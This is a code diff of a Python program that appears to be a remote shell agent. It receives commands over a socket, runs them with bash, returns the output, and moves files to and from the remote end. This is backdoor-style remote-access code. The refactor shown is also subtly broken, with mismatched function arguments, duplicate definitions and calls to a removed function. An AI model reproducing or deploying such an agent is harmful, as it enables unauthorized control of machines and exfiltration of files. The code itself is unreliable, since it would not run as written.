@@ -6,8 +6,6 @@ import time
 import os
 
 # Constants
-READY_STATUS = b"ready_3X1T_5TATUS="
-EXIT_STATUS = b"_3X1T_5TATUS=0"
 SENDING_FILE = b"sendingfile"
 GETTING_FILE = b"gettingfile"
 
@@ -20,32 +18,49 @@ def connect_to_host(host, port):
 def receive_file(filename, sock):
     """Receives a file from the socket and writes it to the local system."""
     with open(filename, "wb") as f:
-        sock.send(READY_STATUS)
+        sock.sendall(b"0")
         while (data := sock.recv(1024)):
             f.write(data)
 
 def send_file(filename, sock):
     """Reads a file from the local system and sends it through the socket."""
     with open(filename, "rb") as f:
-        while (chunk := f.read(1024)):
-            sock.send(chunk)
-        sock.send(EXIT_STATUS)
+        send_response(f.read(), len(f.read()))
+
+def change_directory(cmd, folder, s):
+    try:
+        os.chdir(folder)
+        stdout_value = b"INFO: no output"
+    except FileNotFoundError:
+        stdout_value = f"ERROR: File {folder} not found".encode()
+    finally:
+        message_length = len(stdout_value)
+        s.sendall(message_length.to_bytes(4, byteorder="big"))
+        s.sendall(stdout_value)
 
 def handle_file_transfers(data, s):
     """Handles file transfers based on the received data."""
+    if data.decode().split(" ")[0] == "cd":
+        cmd = data.decode().split(" ")[0]
+        folder = data.decode().split(" ")[1]
+        change_directory(cmd, folder, s)
+        return True
     if SENDING_FILE in data:
         file = data.decode().split("sendingfile/")[1].split(" &&")[0].strip()
         receive_file(file, s)
+        return True
     if GETTING_FILE in data:
         file = data.decode().split("gettingfile/")[1].split(" &&")[0].strip()
         send_file(file, s)
+        return True
+    return False
 
 class Shell:
     def __init__(self):
-        self.end_marker = 'END_OF_COMMAND'
+        self.end_marker = "END_OF_COMMAND" # TODO: This shouldnt be needed
 
     def execute_command(self, command):
-        completed_process = subprocess.run(['/bin/bash', '-c', command],
+        completed_process = subprocess.run(["/bin/bash", "-c", command],
                                            stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE)
 
@@ -66,20 +81,22 @@ class Shell:
                     if self.end_marker.encode() in chunk:
                         return out[:-len(self.end_marker)], err
 
-def execute_command_and_send_response(data, s, shell):
+def execute_command(data, shell):
     """Executes a command and sends the response back through the socket."""
-    stdout_value, stderr_value = shell.execute_command(data.decode('utf-8'))
-    message_length = len(stdout_value) + len(stderr_value)
-    print(message_length)
+    stdout_value, stderr_value = shell.execute_command(data.decode("utf-8")).decode()
+    msg = f"{stdout_value}\n{stderr_value}"
+    message_length = len(msg)
+    
+    send_response(msg, message_length)
 
+def send_response(s, msg, message_length):
     if message_length > 0:
-        s.sendall(message_length.to_bytes(4, byteorder='big'))
-        s.sendall(stdout_value)
-        s.sendall(stderr_value)
+        s.sendall(message_length.to_bytes(4, byteorder="big"))
+        s.sendall(msg)
     else:
         stdout_value = b"INFO: no output"
         message_length = len(stdout_value)
-        s.sendall(message_length.to_bytes(4, byteorder='big'))
+        s.sendall(message_length.to_bytes(4, byteorder="big"))
         s.sendall(stdout_value)
 
 def execute_command(s):
@@ -87,24 +104,11 @@ def execute_command(s):
     shell = Shell()
     while True:
         data = s.recv(1024)
-        print(data)
-
-        if data.decode().split(" ")[0] == "cd":
-                try:
-                    os.chdir(data.decode().split(" ")[1])
-                    stdout_value = b"INFO: no output"
-                    message_length = len(stdout_value)
-                    s.sendall(message_length.to_bytes(4, byteorder='big'))
-                    s.sendall(stdout_value)
-                except FileNotFoundError:
-                     print('hit')
-                finally:
-                     continue
-
-        handle_file_transfers(data, s)
 
         if not data:
             break
+        if handle_file_transfers(data, s):
+            continue
 
         try:
             execute_command_and_send_response(data, s, shell)
